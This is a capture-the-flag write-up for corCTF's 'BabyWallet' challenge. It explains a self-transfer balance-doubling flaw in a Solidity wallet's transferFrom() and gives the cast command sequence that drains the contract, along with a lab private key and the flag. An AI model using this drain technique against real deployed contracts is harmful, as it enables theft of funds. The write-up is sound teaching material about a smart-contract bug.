# BabyWallet

## Challenge
The challenge is hosted using the paradigm framework. We have the standard setup contract and a small "wallet" contract.

```solidity
pragma solidity ^0.8.17;

contract BabyWallet {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amt) public {
        require(balances[msg.sender] >= amt, "You can't withdraw that much");
        balances[msg.sender] -= amt;
        (bool success, ) = msg.sender.call{value: amt}("");
        require(success, "Failed to withdraw that amount");
    }

    function approve(address recipient, uint256 amt) public {
        allowances[msg.sender][recipient] += amt;
    }

    function transfer(address recipient, uint256 amt) public {
        require(balances[msg.sender] >= amt, "You can't transfer that much");
        balances[msg.sender] -= amt;
        balances[recipient] += amt;
    }

    function transferFrom(address from, address to, uint256 amt) public {
        uint256 allowedAmt = allowances[from][msg.sender];
        uint256 fromBalance = balances[from];
        uint256 toBalance = balances[to];

        require(fromBalance >= amt, "You can't transfer that much");
        require(allowedAmt >= amt, "You don't have approval for that amount");

        balances[from] = fromBalance - amt;
        balances[to] = toBalance + amt;
        allowances[from][msg.sender] = allowedAmt - amt;
    }

    fallback() external payable {}
    receive() external payable {}
}
```

Challenge Description:
I wrote my first Solidity smart contract!

## Solution

The vulnerability is in the updating of balances in transferFrom(). It doesn't take into account that you could use transferFrom() to send money to yourself. If that is the case you can (up to) double your balance with each call. This occurs due to the case that the toBalance variable is saved before the balances[from] is decreased and then used to update the balances[to].

I exploited the vulnerability using cast:

```bash
# uuid:           a32d812c-c017-4525-8898-1abf41e4df7c
# rpc endpoint:   https://baby-wallet.be.ax/a32d812c-c017-4525-8898-1abf41e4df7c
# private key:    0xf71da5b63149c5ab9f6df481625be9349da6caeba24ac775abb99e23c64e517c
# your address:   0x32fd93782E10e80f7C91a7F47CA25DeA2B9Db317
# setup contract: 0x1B7c5c695Af092Da30d1178D43f0858003ab128c

rpc="https://baby-wallet.be.ax/a32d812c-c017-4525-8898-1abf41e4df7c"
priv_key=0xf71da5b63149c5ab9f6df481625be9349da6caeba24ac775abb99e23c64e517c
setup_contract=0x1B7c5c695Af092Da30d1178D43f0858003ab128c
my_addr=0x32fd93782E10e80f7C91a7F47CA25DeA2B9Db317

# get address
cast call $setup_contract "wallet()(address)" --rpc-url $rpc

# Save the address we received.
wallet_contract=0x7c7Aa31DCE00dDbBDfC3755467ebBe04DBa14251

# Findout how much eth we have
cast balance $my_addr --rpc-url $rpc
# We have 5000eth which makes it pretty easy 

# First we deposit 100 eth
cast send --rpc-url $rpc --private-key $priv_key $wallet_contract "deposit()" --value 100ether

# Now we check if our balance has increased as planned
cast call --rpc-url $rpc $wallet_contract "balances(address)(uint256)" $my_addr

# Now we approve ourselves for 100eth
cast send --rpc-url $rpc --private-key $priv_key $wallet_contract "deposit()" --value 100ether

# Call the function
cast send --rpc-url $rpc --private-key $priv_key $wallet_contract "approve(address,uint256)" $my_addr 100ether

# Now we transfer 100 eth from us to us
cast send --rpc-url $rpc --private-key $priv_key $wallet_contract "transferFrom(address,address,uint256)" $my_addr $my_addr 100ether

# Now we check if our balance has increased as planned
cast call --rpc-url $rpc $wallet_contract "balances(address)(uint256)" $my_addr

#Now we withdraw all the money
cast send --rpc-url $rpc --private-key $priv_key $wallet_contract "withdraw(uint256)" 200ether

# Check if it was solved
cast call $setup_contract "isSolved()(bool)" --rpc-url $rpc
```

flag = corctf{inf1nite_m0ney_glitch!!!}